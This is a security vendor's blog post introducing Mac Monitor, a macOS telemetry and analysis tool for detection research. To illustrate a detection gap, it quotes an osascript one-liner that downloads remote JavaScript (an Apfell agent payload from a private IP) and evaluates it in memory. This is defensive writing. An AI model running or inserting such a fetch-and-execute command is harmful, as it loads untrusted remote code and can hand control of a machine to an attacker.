<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://redcanary.com/blog/mac-monitor/">Original</a>
    <h1>Red Canary Mac Monitor</h1>
    
    <div id="readability-page-1" class="page"><div><div><section><div><div><div><div><p><a href="https://redcanary.com/mac-threat-analysis-tool" target="_blank" rel="noopener">Red Canary Mac Monitor</a> is a feature-rich dynamic analysis tool for macOS that leverages our extensive understanding of the platform and Apple’s latest APIs to collect and present relevant security events. Mac Monitor is practically the macOS version of the <a href="https://learn.microsoft.com/en-us/sysinternals/" target="_blank" rel="noopener">Microsoft Sysinternals</a> tool <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/procmon" target="_blank" rel="noopener">Procmon</a>. Mac Monitor collects a wide variety of <a href="https://developer.apple.com/documentation/endpointsecurity/3228936-es_events_t" target="_blank" rel="noopener">telemetry classes</a>, including processes, interprocess, files, file metadata, logins, XProtect detections, and more—enabling defenders to quickly and effectively analyze enriched, high-fidelity macOS security events in a native, modern, and customizable user interface.</p><p><img decoding="async" loading="lazy" src="data:image/svg+xml,%3Csvg%20xmlns=&#39;http://www.w3.org/2000/svg&#39;%20viewBox=&#39;0%200%201024%20573&#39;%3E%3C/svg%3E" alt="" width="1024" height="573" data-lazy-srcset="https://redcanary.com/wp-content/uploads/2023/04/image10-1024x573.png 1024w, https://redcanary.com/wp-content/uploads/2023/04/image10-300x168.png 300w, https://redcanary.com/wp-content/uploads/2023/04/image10-768x430.png 768w, https://redcanary.com/wp-content/uploads/2023/04/image10-1536x860.png 1536w, https://redcanary.com/wp-content/uploads/2023/04/image10.png 1999w" data-lazy-sizes="(max-width: 1024px) 100vw, 1024px" data-lazy-src="https://redcanary.com/wp-content/uploads/2023/04/image10-1024x573.png"/></p><p>Security researchers can use Mac Monitor to perform a wide range of analysis, whether they’re simply confirming their suspicions about unusual system activity or performing more rigorous threat research. For example, we’ve used it for relatively straightforward telemetry generation, running <a href="https://redcanary.com/blog/introducing-atomictestharnesses/">Atomic Test Harnesses</a> and examining the forensic artifacts left behind, as seen in the following image:</p><figure id="attachment_34290" aria-describedby="caption-attachment-34290"><img decoding="async" loading="lazy" src="data:image/svg+xml,%3Csvg%20xmlns=&#39;http://www.w3.org/2000/svg&#39;%20viewBox=&#39;0%200%201024%20438&#39;%3E%3C/svg%3E" alt="Mac Monitor collects telemetry" width="1024" height="438" data-lazy-srcset="https://redcanary.com/wp-content/uploads/2023/03/image13-1024x438.png 1024w, https://redcanary.com/wp-content/uploads/2023/03/image13-300x128.png 300w, https://redcanary.com/wp-content/uploads/2023/03/image13-768x329.png 768w, https://redcanary.com/wp-content/uploads/2023/03/image13-1536x658.png 1536w, https://redcanary.com/wp-content/uploads/2023/03/image13.png 1999w" data-lazy-sizes="(max-width: 1024px) 100vw, 1024px" data-lazy-src="https://redcanary.com/wp-content/uploads/2023/03/image13-1024x438.png"/><figcaption id="caption-attachment-34290"><em>Mac Monitor record of Atomic Test Harness for T1059.007: JavaScript (for Automation)</em></figcaption></figure><p>However, we’ve also used Mac Monitor to conduct more complicated threat research, including work that yielded the discovery of an exploitable vulnerability in Apple’s Gatekeeper functionality (<a href="https://support.apple.com/en-us/HT213670" target="_blank" rel="noopener">CVE-2023-27951</a>). We plan to discuss this work in depth in <a href="https://redcanary.com/resources/webinars/redroc-uncaged-macos-telemetry/">a webinar on April 19</a> and in a subsequent blog shortly thereafter.</p><figure id="attachment_34291" aria-describedby="caption-attachment-34291"><img decoding="async" loading="lazy" src="data:image/svg+xml,%3Csvg%20xmlns=&#39;http://www.w3.org/2000/svg&#39;%20viewBox=&#39;0%200%201024%20605&#39;%3E%3C/svg%3E" alt="Mac Monitor discovers a CVE" width="1024" height="605" data-lazy-srcset="https://redcanary.com/wp-content/uploads/2023/04/image1-1024x605.png 1024w, https://redcanary.com/wp-content/uploads/2023/04/image1-300x177.png 300w, https://redcanary.com/wp-content/uploads/2023/04/image1-768x454.png 768w, https://redcanary.com/wp-content/uploads/2023/04/image1-1536x907.png 1536w, https://redcanary.com/wp-content/uploads/2023/04/image1.png 1999w" data-lazy-sizes="(max-width: 1024px) 100vw, 1024px" data-lazy-src="https://redcanary.com/wp-content/uploads/2023/04/image1-1024x605.png"/><figcaption id="caption-attachment-34291"><em>Mac Monitor uncovering evidence of a novel Gatekeeper bypass technique</em></figcaption></figure><p>Today, we’re releasing <a href="https://github.com/redcanaryco/mac-monitor/releases" target="_blank" rel="noopener">Red Canary Mac Monitor</a> as a stable open beta, and we’re hopeful that the security community can help us improve this complex software by using it and offering feedback.</p><h2>Why did we build Mac Monitor in the first place?</h2><p>Simply put, we developed Mac Monitor to further our understanding of macOS internals so that we could improve Red Canary’s macOS detection capabilities.</p><p>Our job as a company is to find the best possible ways to <a href="https://redcanary.com/products/managed-detection-and-response/" target="_blank" rel="noopener">detect threats across our customers’ IT environments</a> with the tools we have available. In this case, we knew that Apple’s <a href="https://developer.apple.com/documentation/endpointsecurity" target="_blank" rel="noopener">Endpoint Security</a> (ES) API, which is analogous to <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/devtest/event-tracing-for-windows--etw-">Microsoft Event Tracing for Windows</a> in some respects, supported events that would help us improve detection coverage across our customers’ macOS endpoints, but we didn’t have a reliable way to collect, analyze, enrich, and test the efficacy of these events. So, we set out to create a tool that could.</p><p>We wanted to be able to simulate a threat or technique on macOS and then assess the relative quality of the corresponding events generated by ES. In turn, this would empower us to analyze new data sources and determine their viability for detecting malicious activity on macOS devices. However, we also needed a more generic testbed for conducting deeper security research and learning more about the internal workings of macOS. As it turns out, ES provides a rich stream of telemetry that you can tap into with Mac Monitor and learn a great deal about the inner workings of macOS in the process.</p><p>Further, as security researchers, it’s important to understand what macOS does in response to any given action. For example, if we feed macOS a specially crafted file, we have to understand what the system does in response. In other words, we need to know how macOS’s security controls behave in response to suspicious or malicious activity. We can then apply these behavioral understandings to vulnerability research by setting a baseline of “normal” that helps us identify when these controls misbehave—or to create hypotheses about how we can force a security control to misbehave. Both scenarios can result in the discovery and remediation of potentially harmful security vulnerabilities—or, at the very least, better awareness of soft spots that we can help fortify with detection coverage.</p><p>After all, security controls will never be perfect, and Apple consistently patches vulnerabilities and techniques that bypass their security controls with each release of macOS—including two (<a href="https://support.apple.com/en-us/HT213670#:~:text=CVE%2D2023%2D27951%3A%20Brandon%20Dalton%20of%20Red%20Canary%20and%20Csaba%20Fitzl%20(%40theevilbit)%20of%20Offensive%20Security" target="_blank" rel="noopener">CVE-2023-27951</a> and <a href="https://support.apple.com/en-us/HT213670#:~:text=CVE%2D2023%2D27943%3A%20an%20anonymous%20researcher%2C%20Brandon%20Dalton%2C%20Milan%20Tenk%2C%20and%20Arthur%20Valiev">CVE-2023-27943</a>) we plan to discuss in a later blog and webinar.</p></div></div></div></div></section><section></section><section><div><div><div><div><h3>Our requirements</h3><p>Our self-defined requirements for Mac Monitor were strict. We wanted the tool to operate as a System Extension that could tap directly into the ES event stream in order to expose telemetry as an endpoint detection and response (EDR) sensor would, protect it with <a href="https://support.apple.com/en-us/HT204899">System Integrity Protection</a> (SIP), and <a href="https://developer.apple.com/videos/play/wwdc2020-10159/?time=1824" target="_blank" rel="noopener">enable early boot logging</a>. We also wanted the tool to have a powerful and modern user experience that focused on presenting the most impactful events in a clear and compelling way—and that would enable users to filter events and telemetry as needed.</p><h3>Better detection</h3><p>The <a href="https://redcanary.com/blog/atomic-test-harnesses-osx-linux/" target="_blank" rel="noopener">Atomic Test Harness</a> for this technique variation of <a href="https://attack.mitre.org/techniques/T1059/002/" target="_blank" rel="noopener">T1059.002: AppleScript</a> (NSAppleScript) serves as a great example of how Mac Monitor helps us leverage ES for detection improvements. Traditionally, this variation has been hard to detect due to a lack of <a href="https://github.com/jackson5sec/Apfell#:~:text=Pull%20down%20and%20execute%20payload%20in%20memory%3A" target="_blank" rel="noopener">command-line evidence</a>. What you’re trying to detect here is a process executing OSA (Open Scripting Architecture) code.</p><p>The following command line represents a readily observable example of OSA code execution, which causes the creation of a <code>/usr/bin/osascript</code> child process to execute code:</p></div></div></div></div></section><section><div><div><div><div><pre><code>osascript -l JavaScript -e &#34;eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(&#39;HTTP://192.168.0.119:8080/apfell-jxa&#39;)),$.NSUTF8StringEncoding)));&#34;</code></pre></div></div></div></div></section>   <section><div><div><div><div><p>By contrast, the test harness executes OSA code via <code>NSAppleScript / OSAKit</code> APIs and is independent of the <code>osascript</code> command-line binary. As such, it does not generate a child process–removing a crucial piece of forensic evidence that would be otherwise useful for developing detection coverage.</p><p>However, there’s an ES event (<code>ES_EVENT_TYPE_NOTIFY_MMAP</code>) that closes this gap, and Red Canary Mac Monitor enabled us to identify and test that ES event, improving our detection coverage in the process.</p><h3>A better analytical tool</h3><p>During our <a href="https://redcanary.com/blog/applescript/" target="_blank" rel="noopener">Open Scripting Architecture (OSA) webinar</a> in October 2022, we walked the audience through a demo of an adversary establishing remote access using the <a href="https://github.com/MythicAgents/apfell" target="_blank" rel="noopener">Apfell Mythic agent</a> via API in-memory (very similar to our <code>NSAppleScript</code> example above). Lacking a better alternative at the time, we extracted the relevant events from macOS and displayed them to the audience in raw, manually searchable JSON telemetry files. Anyone going back and reviewing <a href="https://www.youtube.com/watch?v=gNeVmJqCVoI" target="_blank" rel="noopener">that video</a> will immediately notice the inherent difficulties this presents.</p><p>All of the “ES collection” tools we’ve seen simply subscribe to a list of pre-selected events and either apply an event model or dump event data into a JSON file ordered by event time. Most do not offer a user interface. As a clear example of this, we ran ESLogger with the default subscription list offered by Mac Monitor:</p></div></div></div></div></section><section><div><div><div><div><pre><code>&gt; sudo eslogger exec fork mmap btm_launch_item_add btm_launch_item_remove create exit rename trace openssh_login deleteextattr cs_invalidated remote_thread_create xp_malware_detected login_login lw_session_unlock mount &gt; ~/Downloads/eslogger_nsapplescript.json</code></pre></div></div></div></div></section>   <section><div><div><div><div><p><code>eslogger</code> produces ~1,791 events for our <code>NSAppleScript</code> example. Mac Monitor—with its fully customizable default mute set applied—cut down on the noise by about 25 percent. Beyond this, events are correlated and enriched with data not available in the ES event stream. Simply put, Mac Monitor is <em>ready for security research right out of the box</em>—a use case that’s often outside the scope of pure collection tools.</p><p>Speaking of default mute sets… the one we apply is readily viewable to end users in the application settings, where you can also export the full mute set to JSON. For those interested, you can also check out <a href="https://github.com/redcanaryco/mac-monitor/blob/main/Mute%20sets/es_default_mute_set_13_3_1.json" target="_blank" rel="noopener">the default mute set applied by Apple to all ES clients initially</a>. Apple does this in the interest of system stability, and you’ll notice that all targeted events are of the “authorize” variety.</p><p>Despite JSON being a pretty common way to represent endpoint telemetry (we even support it as an export option), it’s problematic for several reasons:</p><ul><li><strong>It’s not clear what’s important and what’s not</strong>. In other words, you need to be an experienced security analyst already to actionably use the telemetry in this form.</li><li>JSON files are <strong>neither presentation quality nor interactive.</strong></li><li>There’s <strong>no easy way to hunt through the data</strong> without secondary tooling. Event correlation and process trees and groups are some of the most important UX elements for in-the-wild threat hunting and dynamic analysis tools like Mac Monitor.</li><li>It’s prohibitively <strong>difficult to filter or mute irrelevant information</strong> without subject matter knowledge and additional tooling.<ul><li>By extension, it’s difficult to develop detection heuristics amidst the low signal-to-noise-ratio offered by a JSON file.</li></ul></li><li>To date, there has <strong>not been a feasible Sysinternals: Procmon equivalent for macOS</strong> (Windows gets all the fun stuff!)<ul><li>For the same features, researchers had to aggregate telemetry from several different tools and data sources.</li></ul></li><li><strong>Many tools lack necessary functionality and do not collect the data sources we need.</strong></li></ul><p>Mac Monitor solves all of these problems and more!</p><h2>Conclusion</h2><p>Historically, when performing detection and vulnerability research, we would either rely on existing public tools and/or commercial endpoint sensors. They will always have their place and purpose, but they make a lot of compromises in terms of feature set, data access, telemetry resolution, and user experience. These tools are not necessarily designed to accomplish the same things we’ve done with Mac Monitor. Red Canary Mac Monitor makes it easy to navigate and work with this enriched ES telemetry stream, which not only facilitates our research but also helps inform how the other products we rely upon can be improved.</p><p>Additionally, as we mention in <a href="https://github.com/redcanaryco/mac-monitor/releases" target="_blank" rel="noopener">the installer</a>, the barrier to entry for macOS threat research can seem scary, especially when compared to Windows, for which there is ample tooling. At Red Canary we hope to lower the barrier a bit more to enable more more folks to enter the discussion around Apple’s Endpoint Security APIs.</p><p>You can find detailed installation instructions explaining how to download and run Mac Monitor Mac Monitor <a href="https://github.com/redcanaryco/mac-monitor" target="_blank" rel="noopener">here</a>.</p><p><img decoding="async" loading="lazy" src="data:image/svg+xml,%3Csvg%20xmlns=&#39;http://www.w3.org/2000/svg&#39;%20viewBox=&#39;0%200%201024%20778&#39;%3E%3C/svg%3E" alt="" width="1024" height="778" data-lazy-srcset="https://redcanary.com/wp-content/uploads/2023/04/image8-1024x778.png 1024w, https://redcanary.com/wp-content/uploads/2023/04/image8-300x228.png 300w, https://redcanary.com/wp-content/uploads/2023/04/image8-768x583.png 768w, https://redcanary.com/wp-content/uploads/2023/04/image8.png 1464w" data-lazy-sizes="(max-width: 1024px) 100vw, 1024px" data-lazy-src="https://redcanary.com/wp-content/uploads/2023/04/image8-1024x778.png"/></p><h3>Thanks, inspiration, and further reading</h3><p>The creation of Mac Monitor was inspired by the great work of others in the macOS and Windows security communities, and so we want to extend a massive thanks to everyone listed below (in no particular order):</p><ul><li>Red Canary’s Detection Enablement team and CSO leadership, particularly <a href="https://redcanary.com/authors/matt-graeber/" target="_blank" rel="noopener">Matt Graeber</a> and <a href="https://redcanary.com/authors/jimmy-astle/" target="_blank" rel="noopener">Jimmy Astle</a> for their thoughtful, kind, and invaluable feedback throughout the architecture and development process. Without them this project would have never left the lab and looked very different.</li><li>A heartfelt thank you goes out to <a href="https://www.hackingwithswift.com/about" target="_blank" rel="noopener">Paul Hudson</a> (and <a href="https://www.youtube.com/watch?v=5bhvVm3QKME" target="_blank" rel="noopener">the Samoyeds</a>) of Hacking with Swift whose books and content helped me fall in love with SwiftUI!</li><li>The <a href="https://themittenmac.com/the-esf-playground/" target="_blank" rel="noopener">ESF Playground</a> by <a href="https://themittenmac.com/author/jaron-bradley/" target="_blank" rel="noopener">Jaron Bradley</a> of The Mitten Mac: The ESF Playground’s idea of pre-configurable event subscriptions helped influence the runtime dynamic event subscription feature of Mac Monitor. Additionally, the ESF Playground’s large coverage of ES events helped influence our event subscription focus. Jaron is also a close friend of Red Canary and I’ve personally learned a lot from him.</li><li><a href="https://github.com/SuprHackerSteve/Crescendo" target="_blank" rel="noopener">Crescendo</a> by <a href="https://twitter.com/SuprHackerSteve" target="_blank" rel="noopener">Steve Davis</a> of Apple: Crescendo massively helped shape the initial focus of Mac Monitor, particularly the idea of displaying events in a table (we’ve explored other formats as well—maybe more to come in the future). Additionally, we’ve iterated on many of the core features. For example, dropping platform binaries, deep event metadata UI, telemetry export, etc.</li><li><a href="https://objective-see.org/products/utilities.html#ProcessMonitor" target="_blank" rel="noopener">ProcessMonitor</a> and <a href="https://objective-see.org/products/utilities.html#FileMonitor" target="_blank" rel="noopener">FileMonitor</a> by <a href="https://twitter.com/patrickwardle" target="_blank" rel="noopener">Patrick Wardle</a> of Objective-See: These two tools along with Patrick’s blogs helped influence the initial set of Endpoint Security event subscriptions. Not to mention the trove of content that he’s developed for the community at no cost! Patrick’s openness to sharing security relevant content played no small role in kick-starting my journey into macOS security research.</li><li><a href="https://labs.withsecure.com/publications/esfang-exploring-the-macos-endpoint-security-framework-for-threat-detection" target="_blank" rel="noopener">ESFang</a> by <a href="https://uk.linkedin.com/in/connormorley" target="_blank" rel="noopener">Connor Morley</a> of WithSecure: ESFang along with Crescendo are examples of two other open source projects that implement the Endpoint Security APIs. Connor’s blog along with ESFang helped kick-start the architecture of the tool.</li><li><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/procmon" target="_blank" rel="noopener">Procmon by Microsoft</a>: Procmon’s feature set such as filtering, dropping, and deep event metadata helped establish a core feature set we wanted implemented.</li><li>Finally, a massive thank you to Apple’s Endpoint Security team for not only standardizing macOS telemetry and bringing security products out of the kernel, but also for consistently introducing new API features and events.</li></ul></div></div></div></div></section><section></section><section></section></div></div><p><span>Our website uses cookies to provide you with a better browsing experience. More information can be found in our <a href="https://redcanary.com/privacy-policy">Privacy Policy</a>.</span></p></div>
  </body>
</html>
